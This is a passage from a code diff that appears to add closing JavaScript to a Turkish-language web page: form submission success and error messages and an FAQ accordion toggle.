+      showSuccess('Başvurunuz başarıyla kaydedildi! En kısa sürede dönüş yapılacak.');
+      // Formu temizle (isteğe bağlı)
+    } catch(err) { showError('Veri kaydedilemedi: ' + err.message); }
+  });
+
+  // Accordion
+  document.querySelectorAll('.faq-item').forEach(item => {
+    item.querySelector('.faq-question').addEventListener('click', () => item.classList.toggle('active'));
+  });
+</script>
 </body>
 </html>
